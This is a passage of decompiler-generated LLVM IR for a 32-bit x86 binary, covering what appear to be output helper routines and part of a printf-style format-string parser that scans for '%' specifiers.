  %v12_804bf86 = icmp eq i32 %v2_804bf86, 0
  store i32 %v2_804bf86, i32* %eax.global-to-local, align 4
  br i1 %v12_804bf86, label %dec_label_pc_804bf99, label %dec_label_pc_804bf8a

dec_label_pc_804bf8a:                             ; preds = %dec_label_pc_804bf78
  store i32 %v3_804bf80, i32* %v2_804bf83, align 4
  %v0_804bf8d = load i32, i32* @ecx, align 4
  %v0_804bf8e = load i32, i32* %eax.global-to-local, align 4
  %v0_804bf8f = load i32, i32* %edx.global-to-local, align 4
  %v0_804bf90 = load i32, i32* @ebx, align 4
  %v4_804bf91 = inttoptr i32 %v0_804bf90 to i16*
  %v5_804bf91 = call i32 @function_804fc0c(i16* %v4_804bf91, i32 %v0_804bf8f, i32 %v0_804bf8e, i32 %v0_804bf8d)
  store i32 %v5_804bf91, i32* %eax.global-to-local, align 4
  %v0_804bf99.pre = load i32, i32* @ebx, align 4
  %v2_804bf9f.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804bf99

dec_label_pc_804bf99:                             ; preds = %dec_label_pc_804bf78, %dec_label_pc_804bf8a
  %v2_804bf9f = phi i32 [ %tmp11, %dec_label_pc_804bf78 ], [ %v2_804bf9f.pre, %dec_label_pc_804bf8a ]
  %v0_804bf99 = phi i32 [ %arg1, %dec_label_pc_804bf78 ], [ %v0_804bf99.pre, %dec_label_pc_804bf8a ]
  %v1_804bf99 = add i32 %v0_804bf99, 16
  %v2_804bf99 = inttoptr i32 %v1_804bf99 to i32*
  %v3_804bf99 = load i32, i32* %v2_804bf99, align 4
  store i32 %v3_804bf99, i32* %eax.global-to-local, align 4
  %v2_804bf9c = add i32 %v0_804bf99, 8
  %v3_804bf9c = inttoptr i32 %v2_804bf9c to i32*
  %v4_804bf9c = load i32, i32* %v3_804bf9c, align 4
  %v5_804bf9c = sub i32 %v3_804bf99, %v4_804bf9c
  store i32 %v5_804bf9c, i32* %eax.global-to-local, align 4
  store i32 %v2_804bf9f, i32* @edx, align 4
  store i32 %v0_804bf78, i32* @ebx, align 4
  ret i32 %v5_804bf9c

; uselistorder directives
  uselistorder i32 %v0_804bf99, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804bf99, { 1, 0 }
}

define i32 @function_804bfa4() local_unnamed_addr {
dec_label_pc_804bfa4:
  %stack_var_-13 = alloca i32, align 4
  %v0_804bfa4 = load i32, i32* @edi, align 4
  %v0_804bfa5 = load i32, i32* @esi, align 4
  %v0_804bfa6 = load i32, i32* @ebx, align 4
  %v0_804bfa7 = load i32, i32* @eax, align 4
  store i32 %v0_804bfa7, i32* @edi, align 4
  %v0_804bfac = load i32, i32* @ecx, align 4
  store i32 %v0_804bfac, i32* @esi, align 4
  store i32 %v0_804bfac, i32* @ebx, align 4
  %v0_804bfb0 = load i32, i32* @edx, align 4
  store i32 %v0_804bfb0, i32* %stack_var_-13, align 4
  %v1_804bfb72 = icmp eq i32 %v0_804bfac, 0
  br i1 %v1_804bfb72, label %dec_label_pc_804bfcf, label %dec_label_pc_804bfbb.lr.ph

dec_label_pc_804bfbb.lr.ph:                       ; preds = %dec_label_pc_804bfa4
  %v2_804bfbb = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804bfbb

dec_label_pc_804bfb6:                             ; preds = %dec_label_pc_804bfbb
  %v1_804bfb6 = add i32 %v0_804bfb6, -1
  %v8_804bfb6 = icmp eq i32 %v1_804bfb6, 0
  store i32 %v1_804bfb6, i32* @ebx, align 4
  br i1 %v8_804bfb6, label %dec_label_pc_804bfcf.loopexit, label %dec_label_pc_804bfb6.dec_label_pc_804bfbb_crit_edge

dec_label_pc_804bfb6.dec_label_pc_804bfbb_crit_edge: ; preds = %dec_label_pc_804bfb6
  %v0_804bfbf.pre = load i32, i32* @edx, align 4
  %v0_804bfc0.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804bfbb

dec_label_pc_804bfbb:                             ; preds = %dec_label_pc_804bfb6.dec_label_pc_804bfbb_crit_edge, %dec_label_pc_804bfbb.lr.ph
  %v0_804bfc0 = phi i32 [ %v0_804bfc0.pre, %dec_label_pc_804bfb6.dec_label_pc_804bfbb_crit_edge ], [ %v0_804bfa7, %dec_label_pc_804bfbb.lr.ph ]
  %v0_804bfbf = phi i32 [ %v0_804bfbf.pre, %dec_label_pc_804bfb6.dec_label_pc_804bfbb_crit_edge ], [ %v0_804bfb0, %dec_label_pc_804bfbb.lr.ph ]
  %v4_804bfc4 = call i32 @function_804fc8c(i32 %v2_804bfbb, i32 1, i32 %v0_804bfc0, i32 %v0_804bfbf)
  %v8_804bfcc = icmp eq i32 %v4_804bfc4, 1
  %v0_804bfb6 = load i32, i32* @ebx, align 4
  br i1 %v8_804bfcc, label %dec_label_pc_804bfb6, label %dec_label_pc_804bfcf.loopexit

dec_label_pc_804bfcf.loopexit:                    ; preds = %dec_label_pc_804bfb6, %dec_label_pc_804bfbb
  %v1_804bfcf.ph = phi i32 [ %v0_804bfb6, %dec_label_pc_804bfbb ], [ 0, %dec_label_pc_804bfb6 ]
  %v0_804bfcf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bfcf

dec_label_pc_804bfcf:                             ; preds = %dec_label_pc_804bfcf.loopexit, %dec_label_pc_804bfa4
  %v0_804bfcf = phi i32 [ 0, %dec_label_pc_804bfa4 ], [ %v0_804bfcf.pre, %dec_label_pc_804bfcf.loopexit ]
  %v1_804bfcf = phi i32 [ 0, %dec_label_pc_804bfa4 ], [ %v1_804bfcf.ph, %dec_label_pc_804bfcf.loopexit ]
  %v2_804bfcf = sub i32 %v0_804bfcf, %v1_804bfcf
  store i32 %v0_804bfa6, i32* @ebx, align 4
  store i32 %v0_804bfa5, i32* @esi, align 4
  store i32 %v0_804bfa4, i32* @edi, align 4
  ret i32 %v2_804bfcf

; uselistorder directives
  uselistorder i32 %v1_804bfb6, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804bfcf.loopexit, { 1, 0 }
}

define i32 @function_804bfda(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804bfda:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804bfed = trunc i32 %arg2 to i8
  %v5_804bfed = icmp slt i8 %v3_804bfed, 0
  %v1_804bfef = icmp eq i1 %v5_804bfed, false
  br i1 %v1_804bfef, label %dec_label_pc_804c020, label %dec_label_pc_804bff1

dec_label_pc_804bff1:                             ; preds = %dec_label_pc_804bfda
  %v1_804bff8 = inttoptr i32 %arg4 to i8*
  %v2_804bff8 = call i32 @function_804d1ac(i8* %v1_804bff8)
  %v0_804c000 = load i32, i32* @ebx, align 4
  %v2_804c000 = sub i32 %v0_804c000, %v2_804bff8
  store i32 %v2_804c000, i32* @ebx, align 4
  store i32 %v2_804bff8, i32* @esi, align 4
  %tmp18 = icmp slt i32 %v2_804c000, 1
  br i1 %tmp18, label %dec_label_pc_804c01e, label %dec_label_pc_804c008

dec_label_pc_804c008:                             ; preds = %dec_label_pc_804bff1
  %v0_804c008 = load i32, i32* @edi, align 4
  %v1_804c008 = urem i32 %v0_804c008, 128
  store i32 %v1_804c008, i32* @edi, align 4
  store i32 %v2_804c000, i32* @ecx, align 4
  store i32 %v1_804c008, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_804c013 = call i32 @function_804bfa4()
  store i32 %v0_804c013, i32* @ebp, align 4
  %v12_804c01a = icmp eq i32 %v0_804c013, %v2_804c000
  %v1_804c01c = icmp eq i1 %v12_804c01a, false
  br i1 %v1_804c01c, label %dec_label_pc_804c03a, label %dec_label_pc_804c008.dec_label_pc_804c01e_crit_edge

dec_label_pc_804c008.dec_label_pc_804c01e_crit_edge: ; preds = %dec_label_pc_804c008
  %v0_804c01e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c01e

dec_label_pc_804c01e:                             ; preds = %dec_label_pc_804c008.dec_label_pc_804c01e_crit_edge, %dec_label_pc_804bff1
  %v0_804c01e = phi i32 [ %v0_804c01e.pre, %dec_label_pc_804c008.dec_label_pc_804c01e_crit_edge ], [ %v2_804bff8, %dec_label_pc_804bff1 ]
  store i32 %v0_804c01e, i32* @ebx, align 4
  br label %dec_label_pc_804c020

dec_label_pc_804c020:                             ; preds = %dec_label_pc_804bfda, %dec_label_pc_804c01e
  %v0_804c02b = phi i32 [ %arg3, %dec_label_pc_804bfda ], [ %v0_804c01e, %dec_label_pc_804c01e ]
  %tmp19 = icmp slt i32 %v0_804c02b, 1
  br i1 %tmp19, label %dec_label_pc_804c038, label %dec_label_pc_804c026

dec_label_pc_804c026:                             ; preds = %dec_label_pc_804c020
  %v0_804c026 = load i32, i32* @ecx, align 4
  %v4_804c030 = call i32 @function_804fc8c(i32 %arg4, i32 %v0_804c02b, i32 %arg1, i32 %v0_804c026)
  br label %dec_label_pc_804c038

dec_label_pc_804c038:                             ; preds = %dec_label_pc_804c020, %dec_label_pc_804c026
  %v1_804c038 = phi i32 [ 0, %dec_label_pc_804c020 ], [ %v4_804c030, %dec_label_pc_804c026 ]
  %v0_804c038 = load i32, i32* @ebp, align 4
  %v2_804c038 = add i32 %v0_804c038, %v1_804c038
  br label %dec_label_pc_804c03a

dec_label_pc_804c03a:                             ; preds = %dec_label_pc_804c008, %dec_label_pc_804c038
  %v0_804c03d = phi i32 [ %v0_804c013, %dec_label_pc_804c008 ], [ %v2_804c038, %dec_label_pc_804c038 ]
  ret i32 %v0_804c03d

; uselistorder directives
  uselistorder i32 %v0_804c02b, { 1, 0 }
  uselistorder i32 %v0_804c013, { 1, 0, 2 }
  uselistorder i32 %v1_804c008, { 1, 0 }
  uselistorder i32 %v2_804c000, { 0, 2, 1, 3 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804c03a, { 1, 0 }
  uselistorder label %dec_label_pc_804c038, { 1, 0 }
  uselistorder label %dec_label_pc_804c020, { 1, 0 }
}

define i32 @function_804c044(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804c044:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_804c04e = ptrtoint i8* %arg2 to i32
  store i32 %v4_804c04e, i32* @ebx, align 4
  %v2_804c056 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804c056, i32* @esi, align 4
  %v4_804c05b = call i32 @function_804c5ec(i32* nonnull %stack_var_-348, i32 %v4_804c04e)
  store i32 %v4_804c05b, i32* %eax.global-to-local, align 4
  %v2_804c063 = icmp slt i32 %v4_804c05b, 0
  %v1_804c065 = icmp eq i1 %v2_804c063, false
  br i1 %v1_804c065, label %dec_label_pc_804c0a5, label %dec_label_pc_804c067

dec_label_pc_804c067:                             ; preds = %dec_label_pc_804c044
  %v3_804c067 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804c067, i32* @ebx, align 4
  %v1_804c06f = inttoptr i32 %v3_804c067 to i8*
  %v2_804c06f = call i32 @function_804d1ac(i8* %v1_804c06f)
  store i32 %v2_804c06f, i32* %eax.global-to-local, align 4
  %v1_804c077 = icmp eq i32 %v2_804c06f, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_804c077, label %dec_label_pc_804c5de, label %dec_label_pc_804c086

dec_label_pc_804c086:                             ; preds = %dec_label_pc_804c067
  %v0_804c086 = load i32, i32* @edx, align 4
  %v0_804c08f = load i32, i32* @ebx, align 4
  %v5_804c090 = call i32 @function_804fc8c(i32 %v0_804c08f, i32 %v2_804c06f, i32 %arg1, i32 %v0_804c086)
  store i32 %v5_804c090, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_804c5de

dec_label_pc_804c0a5:                             ; preds = %dec_label_pc_804c044
  %v5_804c0af = call i32 @function_804c65c(i32 %v2_804c056, i32 %arg3, i32 %v4_804c05b, i32 %v4_804c05b)
  store i32 %v5_804c0af, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804c0bc = load i32, i32* @ebx, align 4
  store i32 %v0_804c0bc, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c0c4

dec_label_pc_804c0c3:                             ; preds = %dec_label_pc_804c0ca
  %v1_804c0c3 = add i32 %v0_804c0d2, 1
  store i32 %v1_804c0c3, i32* @ebx, align 4
  br label %dec_label_pc_804c0c4.backedge

dec_label_pc_804c0c4.backedge:                    ; preds = %dec_label_pc_804c0c3, %dec_label_pc_804c5c4, %dec_label_pc_804c5cf
  %v1_804c0ce18 = phi i32 [ %v1_804c0d6, %dec_label_pc_804c0c3 ], [ %v3_804c5c4, %dec_label_pc_804c5c4 ], [ %v1_804c102, %dec_label_pc_804c5cf ]
  %v0_804c0c416 = phi i32 [ %v1_804c0c3, %dec_label_pc_804c0c3 ], [ %v3_804c5c4, %dec_label_pc_804c5c4 ], [ %v1_804c5cf, %dec_label_pc_804c5cf ]
  %v4_804c0c4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c0c4

dec_label_pc_804c0c4:                             ; preds = %dec_label_pc_804c0c4.backedge, %dec_label_pc_804c0a5
  %v1_804c0d6 = phi i32 [ %v1_804c0ce18, %dec_label_pc_804c0c4.backedge ], [ %v0_804c0bc, %dec_label_pc_804c0a5 ]
  %v0_804c0d2 = phi i32 [ %v0_804c0c416, %dec_label_pc_804c0c4.backedge ], [ %v0_804c0bc, %dec_label_pc_804c0a5 ]
  %v4_804c0c4 = phi i32 [ %v4_804c0c4.pre, %dec_label_pc_804c0c4.backedge ], [ %v5_804c0af, %dec_label_pc_804c0a5 ]
  %v1_804c0c4 = inttoptr i32 %v0_804c0d2 to i8*
  %v2_804c0c4 = load i8, i8* %v1_804c0c4, align 1
  %v3_804c0c4 = zext i8 %v2_804c0c4 to i32
  %v5_804c0c4 = and i32 %v4_804c0c4, -256
  %v6_804c0c4 = or i32 %v3_804c0c4, %v5_804c0c4
  store i32 %v6_804c0c4, i32* %eax.global-to-local, align 4
  %v4_804c0c6 = icmp eq i8 %v2_804c0c4, 0
  br i1 %v4_804c0c6, label %dec_label_pc_804c0ce, label %dec_label_pc_804c0ca

dec_label_pc_804c0ca:                             ; preds = %dec_label_pc_804c0c4
  %v10_804c0ca = icmp eq i8 %v2_804c0c4, 37
  %v1_804c0cc = icmp eq i1 %v10_804c0ca, false
  br i1 %v1_804c0cc, label %dec_label_pc_804c0c3, label %dec_label_pc_804c0ce

dec_label_pc_804c0ce:                             ; preds = %dec_label_pc_804c0ca, %dec_label_pc_804c0c4
  %v2_804c0ce = sub i32 %v0_804c0d2, %v1_804c0d6
  %v12_804c0ce = icmp eq i32 %v2_804c0ce, 0
  br i1 %v12_804c0ce, label %dec_label_pc_804c0f9, label %dec_label_pc_804c0d2

dec_label_pc_804c0d2:                             ; preds = %dec_label_pc_804c0ce
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804c0ce, i32* @esi, align 4
  %tmp64 = icmp slt i32 %v2_804c0ce, 1
  br i1 %tmp64, label %dec_label_pc_804c0ee, label %dec_label_pc_804c0dc

dec_label_pc_804c0dc:                             ; preds = %dec_label_pc_804c0d2
  %v0_804c0dc = load i32, i32* @ebp, align 4
  %v1_804c0dc = load i32, i32* @esp, align 4
  %v2_804c0dc = add i32 %v1_804c0dc, -4
  %v3_804c0dc = inttoptr i32 %v2_804c0dc to i32*
  store i32 %v0_804c0dc, i32* %v3_804c0dc, align 4
  %v1_804c0dd = add i32 %v1_804c0dc, 368
  %v2_804c0dd = inttoptr i32 %v1_804c0dd to i32*
  %v3_804c0dd = load i32, i32* %v2_804c0dd, align 4
  %v5_804c0dd = add i32 %v1_804c0dc, -8
  %v6_804c0dd = inttoptr i32 %v5_804c0dd to i32*
  store i32 %v3_804c0dd, i32* %v6_804c0dd, align 4
  %v0_804c0e4 = load i32, i32* @esi, align 4
  %v2_804c0e4 = add i32 %v1_804c0dc, -12
  %v3_804c0e4 = inttoptr i32 %v2_804c0e4 to i32*
  store i32 %v0_804c0e4, i32* %v3_804c0e4, align 4
  %v0_804c0e5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c0e5 = add i32 %v1_804c0dc, -16
  %v3_804c0e5 = inttoptr i32 %v2_804c0e5 to i32*
  store i32 %v0_804c0e5, i32* %v3_804c0e5, align 4
  %v0_804c0e6 = load i32, i32* %stack_var_-364, align 4
  %v4_804c0e6 = call i32 @function_804fc8c(i32 %v0_804c0e6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c0e6, i32* %eax.global-to-local, align 4
  %v1_804c0ee.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c0ee

dec_label_pc_804c0ee:                             ; preds = %dec_label_pc_804c0d2, %dec_label_pc_804c0dc
  %v3_804c0f6 = phi i32 [ %v2_804c0ce, %dec_label_pc_804c0d2 ], [ %v1_804c0ee.pre, %dec_label_pc_804c0dc ]
  %v0_804c0ee = phi i32 [ 0, %dec_label_pc_804c0d2 ], [ %v4_804c0e6, %dec_label_pc_804c0dc ]
  %v12_804c0ee = icmp eq i32 %v0_804c0ee, %v3_804c0f6
  %v1_804c0f0 = icmp eq i1 %v12_804c0ee, false
  %v0_804c5d7.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804c0f0, label %dec_label_pc_804c5d7, label %dec_label_pc_804c0f6

dec_label_pc_804c0f6:                             ; preds = %dec_label_pc_804c0ee
  %v1_804c0f6 = inttoptr i32 %v0_804c5d7.pre.pre to i32*
  %v2_804c0f6 = load i32, i32* %v1_804c0f6, align 4
  %v4_804c0f6 = add i32 %v2_804c0f6, %v3_804c0f6
  store i32 %v4_804c0f6, i32* %v1_804c0f6, align 4
  %v0_804c0f9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c0f9

dec_label_pc_804c0f9:                             ; preds = %dec_label_pc_804c0ce, %dec_label_pc_804c0f6
  %v0_804c5cf = phi i32 [ %v0_804c0d2, %dec_label_pc_804c0ce ], [ %v0_804c0f9.pre, %dec_label_pc_804c0f6 ]
  %v1_804c0f9 = inttoptr i32 %v0_804c5cf to i8*
  %v2_804c0f9 = load i8, i8* %v1_804c0f9, align 1
  %v3_804c0f9 = icmp eq i8 %v2_804c0f9, 0
  br i1 %v3_804c0f9, label %dec_label_pc_804c5de, label %dec_label_pc_804c102

dec_label_pc_804c102:                             ; preds = %dec_label_pc_804c0f9
  %v1_804c102 = add i32 %v0_804c5cf, 1
  store i32 %v1_804c102, i32* %edx.global-to-local, align 4
  %v2_804c105 = inttoptr i32 %v1_804c102 to i8*
  %v3_804c105 = load i8, i8* %v2_804c105, align 1
  %v12_804c105 = icmp eq i8 %v3_804c105, 37
  br i1 %v12_804c105, label %dec_label_pc_804c5cf, label %dec_label_pc_804c10f

dec_label_pc_804c10f:                             ; preds = %dec_label_pc_804c102
  %v1_804c10f = load i32, i32* @esp, align 4
  %v2_804c10f = add i32 %v1_804c10f, 16
  %v3_804c10f = inttoptr i32 %v2_804c10f to i32*
  store i32 %v1_804c102, i32* %v3_804c10f, align 4
  %v0_804c113 = load i32, i32* @esp, align 4
  %v1_804c113 = add i32 %v0_804c113, 340
  %v2_804c113 = inttoptr i32 %v1_804c113 to i32*
  store i32 0, i32* %v2_804c113, align 4
  %v0_804c11e = load i32, i32* @esp, align 4
  %v1_804c121 = add i32 %v0_804c11e, 16
  store i32 %v1_804c121, i32* @ebx, align 4
  %v2_804c125 = add i32 %v0_804c11e, -16
  %v3_804c125 = inttoptr i32 %v2_804c125 to i32*
  store i32 %v1_804c121, i32* %v3_804c125, align 4
  %v0_804c126 = load i32, i32* %stack_var_-364, align 4
  %v1_804c126 = inttoptr i32 %v0_804c126 to i32*
  %v2_804c126 = call i32 @function_804c7d9(i32* %v1_804c126)
  store i32 %v2_804c126, i32* %eax.global-to-local, align 4
  %v0_804c12b = load i32, i32* @ebx, align 4
  %v1_804c12b = load i32, i32* @esp, align 4
  %v2_804c12b = inttoptr i32 %v1_804c12b to i32*
  store i32 %v0_804c12b, i32* %v2_804c12b, align 4
  %v0_804c12e = load i32, i32* %stack_var_-364, align 4
  %v1_804c12e = call i32 @function_804c6a0(i32 %v0_804c12e)
  store i32 %v1_804c12e, i32* %eax.global-to-local, align 4
  %v0_804c133 = load i32, i32* @esp, align 4
  %v1_804c133 = add i32 %v0_804c133, 70
  %v2_804c133 = inttoptr i32 %v1_804c133 to i8*
  %v3_804c133 = load i8, i8* %v2_804c133, align 1
  %v4_804c133 = zext i8 %v3_804c133 to i32
  store i32 %v4_804c133, i32* @edi, align 4
  %v1_804c138 = add i32 %v0_804c133, 16
  %v1_804c13b = add i32 %v0_804c133, 56
  %v2_804c13b = inttoptr i32 %v1_804c13b to i32*
  %v3_804c13b = load i32, i32* %v2_804c13b, align 4
  %v1_804c140 = add i32 %v0_804c133, 112
  store i32 %v1_804c140, i32* %edx.global-to-local, align 4
  %tmp65 = icmp slt i32 %v3_804c13b, 1
  br i1 %tmp65, label %dec_label_pc_804c14d, label %dec_label_pc_804c146

dec_label_pc_804c146:                             ; preds = %dec_label_pc_804c10f
  %v2_804c146 = zext i8 %v3_804c133 to i32
  %v3_804c146 = mul nuw nsw i32 %v2_804c146, 12
  store i32 %v3_804c146, i32* %eax.global-to-local, align 4
  %v2_804c149 = add i32 %v0_804c133, 100
  %v3_804c149 = add i32 %v2_804c149, %v3_804c146
  store i32 %v3_804c149, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c14d

dec_label_pc_804c14d:                             ; preds = %dec_label_pc_804c10f, %dec_label_pc_804c146
  %v0_804c15526 = phi i32 [ %v1_804c140, %dec_label_pc_804c10f ], [ %v3_804c149, %dec_label_pc_804c146 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804c14f = add i32 %v0_804c133, 60
  %v2_804c14f = inttoptr i32 %v1_804c14f to i32*
  %v3_804c14f = load i32, i32* %v2_804c14f, align 4
  store i32 %v3_804c14f, i32* %ecx.global-to-local, align 4
  %v2_804c16078 = sub i32 0, %v3_804c14f
  %v10_804c16081 = and i32 %v3_804c14f, %v2_804c16078
  %v11_804c16082 = icmp slt i32 %v10_804c16081, 0
  %v13_804c16083 = icmp slt i32 %v2_804c16078, 0
  %v2_804c16284 = icmp eq i1 %v13_804c16083, %v11_804c16082
  br i1 %v2_804c16284, label %dec_label_pc_804c164, label %dec_label_pc_804c155

dec_label_pc_804c155:                             ; preds = %dec_label_pc_804c14d, %dec_label_pc_804c155
  %v0_804c16488 = phi i32 [ %v0_804c164, %dec_label_pc_804c155 ], [ %v1_804c138, %dec_label_pc_804c14d ]
  %v2_804c15587 = phi i32 [ %v1_804c15f, %dec_label_pc_804c155 ], [ 0, %dec_label_pc_804c14d ]
  %v0_804c15586 = phi i32 [ %v1_804c15c, %dec_label_pc_804c155 ], [ %v0_804c15526, %dec_label_pc_804c14d ]
  %v3_804c155 = mul i32 %v2_804c15587, 4
  %v4_804c155 = add i32 %v0_804c16488, 344
  %v5_804c155 = add i32 %v4_804c155, %v3_804c155
  %v6_804c155 = inttoptr i32 %v5_804c155 to i32*
  store i32 %v0_804c15586, i32* %v6_804c155, align 4
  %v0_804c15c = load i32, i32* %edx.global-to-local, align 4
  %v1_804c15c = add i32 %v0_804c15c, 12
  store i32 %v1_804c15c, i32* %edx.global-to-local, align 4
  %v0_804c15f = load i32, i32* %eax.global-to-local, align 4
  %v1_804c15f = add i32 %v0_804c15f, 1
  store i32 %v1_804c15f, i32* %eax.global-to-local, align 4
  %v1_804c160.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c160 = sub i32 %v1_804c15f, %v1_804c160.pre
  %v8_804c160 = xor i32 %v1_804c15f, %v1_804c160.pre
  %v9_804c160 = xor i32 %v2_804c160, %v1_804c15f
  %v10_804c160 = and i32 %v9_804c160, %v8_804c160
  %v11_804c160 = icmp slt i32 %v10_804c160, 0
  %v13_804c160 = icmp slt i32 %v2_804c160, 0
  %v2_804c162 = icmp eq i1 %v13_804c160, %v11_804c160
  %v0_804c164 = load i32, i32* @esp, align 4
  br i1 %v2_804c162, label %dec_label_pc_804c164, label %dec_label_pc_804c155

dec_label_pc_804c164:                             ; preds = %dec_label_pc_804c155, %dec_label_pc_804c14d
  %v0_804c164.lcssa = phi i32 [ %v1_804c138, %dec_label_pc_804c14d ], [ %v0_804c164, %dec_label_pc_804c155 ]
  %v1_804c164 = add i32 %v0_804c164.lcssa, 48
  %v2_804c164 = inttoptr i32 %v1_804c164 to i32*
  %v3_804c164 = load i32, i32* %v2_804c164, align 4
  store i32 %v3_804c164, i32* @ecx, align 4
  %v1_804c168 = icmp eq i32 %v3_804c164, 0
  %v1_804c16a = icmp eq i1 %v1_804c168, false
  br i1 %v1_804c16a, label %dec_label_pc_804c192, label %dec_label_pc_804c16c

dec_label_pc_804c16c:                             ; preds = %dec_label_pc_804c164
  %v1_804c16c = inttoptr i32 %v0_804c164.lcssa to i32*
  %v2_804c16c = load i32, i32* %v1_804c16c, align 4
  store i32 %v2_804c16c, i32* %eax.global-to-local, align 4
  %v1_804c16f = ashr i32 %v2_804c16c, 31
  store i32 %v1_804c16f, i32* %edx.global-to-local, align 4
  %v2_804c170 = add i32 %v0_804c164.lcssa, -4
  %v3_804c170 = inttoptr i32 %v2_804c170 to i32*
  store i32 %v1_804c16f, i32* %v3_804c170, align 4
  %v0_804c171 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c171 = add i32 %v0_804c164.lcssa, -8
  %v3_804c171 = inttoptr i32 %v2_804c171 to i32*
  store i32 %v0_804c171, i32* %v3_804c171, align 4
  %v1_804c172 = add i32 %v0_804c164.lcssa, 32
  %v2_804c172 = inttoptr i32 %v1_804c172 to i32*
  %v3_804c172 = load i32, i32* %v2_804c172, align 4
  %v1_804c176 = and i32 %v3_804c172, 3840
  store i32 %v1_804c176, i32* %eax.global-to-local, align 4
  %v2_804c17b = add i32 %v0_804c164.lcssa, -12
  %v3_804c17b = inttoptr i32 %v2_804c17b to i32*
  store i32 %v1_804c176, i32* %v3_804c17b, align 4
  %v1_804c17c = add i32 %v0_804c164.lcssa, 344
  %v2_804c17c = inttoptr i32 %v1_804c17c to i32*
  %v3_804c17c = load i32, i32* %v2_804c17c, align 4
  store i32 %v3_804c17c, i32* %eax.global-to-local, align 4
  %v1_804c183 = inttoptr i32 %v3_804c17c to i32*
  %v2_804c183 = load i32, i32* %v1_804c183, align 4
  %v4_804c183 = add i32 %v0_804c164.lcssa, -16
  %v5_804c183 = inttoptr i32 %v4_804c183 to i32*
  store i32 %v2_804c183, i32* %v5_804c183, align 4
  %v0_804c185 = call i32 @function_804fe74()
  store i32 %v0_804c185, i32* %eax.global-to-local, align 4
  %v0_804c18a = load i32, i32* @esp, align 4
  %v1_804c18a = add i32 %v0_804c18a, 16
  br label %dec_label_pc_804c5c4

dec_label_pc_804c192:                             ; preds = %dec_label_pc_804c164
  %tmp91 = icmp ult i32 %v3_804c164, 8
  br i1 %tmp91, label %dec_label_pc_804c19b, label %dec_label_pc_804c2fc

dec_label_pc_804c19b:                             ; preds = %dec_label_pc_804c192
  %v1_804c19b = add i32 %v3_804c164, 134559452
  %v2_804c19b = inttoptr i32 %v1_804c19b to i8*
  %v3_804c19b = load i8, i8* %v2_804c19b, align 1
  %v4_804c19b = sext i8 %v3_804c19b to i32
  store i32 %v4_804c19b, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804c1a7 = icmp eq i8 %v3_804c19b, 10
  %v1_804c1aa = icmp eq i1 %v9_804c1a7, false
  br i1 %v1_804c1aa, label %dec_label_pc_804c1c8, label %dec_label_pc_804c1ac

dec_label_pc_804c1ac:                             ; preds = %dec_label_pc_804c19b
  %v1_804c1ac = add i32 %v0_804c164.lcssa, 32
  %v2_804c1ac = inttoptr i32 %v1_804c1ac to i32*
  %v3_804c1ac = load i32, i32* %v2_804c1ac, align 4
  %v1_804c1b2 = and i32 %v3_804c1ac, 32
  store i32 %v1_804c1b2, i32* %eax.global-to-local, align 4
  %tmp66 = udiv i32 %v1_804c1b2, 32
  %tmp67 = sub nsw i32 45, %tmp66
  store i32 %tmp67, i32* @ebx, align 4
  %v1_804c1c0 = trunc i32 %v3_804c1ac to i8
  %v2_804c1c0 = and i8 %v1_804c1c0, 64
  %v3_804c1c0 = icmp eq i8 %v2_804c1c0, 0
  %v5_804c1c0 = zext i8 %v2_804c1c0 to i32
  %v7_804c1c0 = and i32 %v3_804c1ac, -256
  %v8_804c1c0 = or i32 %v5_804c1c0, %v7_804c1c0
  store i32 %v8_804c1c0, i32* %edx.global-to-local, align 4
  br i1 %v3_804c1c0, label %dec_label_pc_804c1c8, label %dec_label_pc_804c1c5

dec_label_pc_804c1c5:                             ; preds = %dec_label_pc_804c1ac
  %v2_804c1c5 = or i32 %tmp67, 128
  store i32 %v2_804c1c5, i32* @ebx, align 4
  br label %dec_label_pc_804c1c8

dec_label_pc_804c1c8:                             ; preds = %dec_label_pc_804c1ac, %dec_label_pc_804c19b, %dec_label_pc_804c1c5
  %tmp92 = icmp ult i32 %v3_804c164, 6
  br i1 %tmp92, label %dec_label_pc_804c1cd, label %dec_label_pc_804c1e5

